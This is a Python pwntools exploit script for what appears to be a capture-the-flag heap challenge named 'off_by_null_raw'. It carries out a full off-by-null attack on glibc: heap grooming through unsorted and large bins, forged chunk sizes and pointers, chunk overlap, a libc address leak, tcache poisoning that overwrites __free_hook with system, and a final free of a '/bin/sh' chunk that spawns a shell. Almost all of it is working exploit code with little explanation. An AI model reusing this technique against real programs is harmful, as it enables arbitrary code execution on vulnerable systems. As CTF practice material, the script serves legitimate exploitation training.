# encoding=utf-8
from pwn import *
context(log_level = 'debug', arch = 'amd64', os = 'linux')

# functions for quick script
s       = lambda data               :p.send(data)        
sa      = lambda delim,data         :p.sendafter(delim, data) 
sl      = lambda data               :p.sendline(data) 
sla     = lambda delim,data         :p.sendlineafter(delim, data) 
r       = lambda numb=4096,timeout=2:p.recv(numb, timeout=timeout)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop) # by default, drop is set to false
irt     = lambda                    :p.interactive()
# misc functions
uu32    = lambda data   :u32(data.ljust(4, '\x00'))
uu64    = lambda data   :u64(data.ljust(8, '\x00')) # to get 8 byte addr 
leak    = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))
# gdb debug
def z(a=''):
    if local:
        gdb.attach(p,a)
        if a == '':
            raw_input()

# basic config
local = 1

elf_path    = "off_by_null_raw"
# libc		= ELF('libc-2.31.so')

elf     = ELF(elf_path)
libc    = elf.libc


def start():
    global p
    if local:
        p = process(elf_path)
    else:
        p = remote('127.0.0.1',10005)

def choice(elect):	
	sla('>',str(elect) )


def choose_idx(idx):
	sla("Index:\n", str(idx))

def add(index,size, content='A'):
	choice(1)
	choose_idx(index)
	sla("Size:", str(size))
	sa("Content:", content)

def edit(index,content,full=False):
	choice(3)
	choose_idx(index)
	sa("Content:", content)

def show(index):
	choice(2)
	choose_idx(index)

def delete(index):
	choice(4)
	choose_idx(index)


start()
# =============================================
# step1 P&0xff = 0
add(0,0x418, "A"*0x100) #0 A = P->fd
add(1,0x108) #1 barrier
add(2,0x438, "B0"*0x100) #2 B0 helper
add(3,0x438, "C0"*0x100) #3 C0 = P , P&0xff = 0
add(4,0x108,'4'*0x100) #4 barrier
add(5, 0x488, "H"*0x100) # H0. helper for write bk->fd. vitcim chunk.
add(6,0x428, "D"*0x100) # 6 D = P->bk
add(7,0x108) # 7 barrier


# =============================================
# step 2 use unsortedbin to set p->fd =A , p->bk=D
delete(0) # A
delete(3) # C0
delete(6) # D
# unsortedbin: D-C0-A   C0->FD=A
delete(2) # merge B0 with C0. preserve p->fd p->bk


add(2, 0x458, 'a' * 0x438 + p64(0x551)[:-2])  # put A,D into largebin, split BC. use B1 to set p->size=0x551

# recovery
add(3,0x418)  # C1 from ub
add(6,0x428)  # bk  D  from largebin
add(0,0x418,"0"*0x100)  # fd 	A from largein

# =============================================
# step3 use unsortedbin to set fd->bk
# partial overwrite fd -> bk 
delete(0) # A=P->fd
delete(3) # C1
# unsortedbin: C1-A ,   A->BK = C1
add(0, 0x418, 'a' * 8)  # 2 partial overwrite bk    A->bk = p
add(3, 0x418)   

# =============================================
# step4 use ub to set bk->fd
delete(3) # C1
delete(6) # D=P->bk
# ub-D-C1    D->FD = C1
delete(5) # merge D with H, preserve D->fd 
add(6,0x500-8, '6'*0x488 + p64(0x431)) # H1. bk->fd = p, partial write \x00

add(3, 0x3b0) # recovery

# =============================================
# step5 off by null
edit(4, 0x100*'4' + p64(0x550))# off by null, set fake_prev_size = 0x550, prev inuse=0
delete(6) # merge H1 with C0. trigger overlap C0,4,6


# =============================================
# step6 overlap 
show(4)
add(6,0x438) # put libc to chunk 4
# z()
show(4) # libc
libc_addr = uu64(r(6)) 
libc_base = libc_addr -  0x1ecbe0
leak('libc_base', libc_base)
leak('libc_addr', libc_addr)

delete(6) # consolidate
add(6, 0x458, 0x438*'6'+p64(0x111)) # fix size for chunk 4. 6 overlap 4


delete(7) # tcache
delete(4) # tcache

edit(6, 0x438*'6'+p64(0x111)+p64(libc_base+libc.sym['__free_hook'])) # set 4->fd= __free_hook
# z()

add(7,0x108,'/bin/sh\x00')
add(4,0x108)
edit(4, p64(libc_base+libc.sym['system']))
z()
delete(7)

irt()